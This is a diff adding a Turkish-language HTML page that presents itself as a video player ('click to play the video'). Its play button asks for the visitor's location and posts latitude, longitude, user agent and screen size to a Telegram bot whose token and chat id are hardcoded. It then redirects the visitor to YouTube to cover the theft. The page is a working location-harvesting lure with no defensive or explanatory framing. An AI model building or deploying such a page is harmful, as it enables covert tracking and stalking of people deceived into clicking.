@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Video Yükleniyor...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #1e1e1e;
+      color: white;
+      text-align: center;
+      padding-top: 100px;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 18px;
+      border-radius: 10px;
+      border: none;
+      background-color: #2f80ed;
+      color: white;
+    }
+    .info {
+      font-size: 16px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Videoyu oynatmak için tıklayın</h2>
+  <button onclick="getLocation()">Oynat</button>
+  <div class="info" id="info"></div>
+
+  <script>
+    function getLocation() {
+      const info = document.getElementById("info");
+      info.innerText = "Yükleniyor...";
+
+      if (!navigator.geolocation) {
+        info.innerText = "Tarayıcınız konum özelliğini desteklemiyor.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const ua = navigator.userAgent;
+          const screenRes = `${screen.width}x${screen.height}`;
+
+          fetch("https://api.telegram.org/bot7315012164:AAFwEEQ-Oi26-gl6o7ulfpCRPzRh1XUPzK8/sendMessage", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: "7874399327",
+              text: `📍 Konum Geldi:\nLatitude: ${lat}\nLongitude: ${lon}\n\n📱 Cihaz: ${ua}\n📏 Ekran: ${screenRes}`
+            })
+          });
+
+          setTimeout(() => {
+            window.location.href = "https://youtube.com";
+          }, 3000);
+        },
+        (err) => {
+          info.innerText = "Konum alınamadı: " + err.message;
+        }
+      );
+    }
+  </script>
+</body>
+</html>
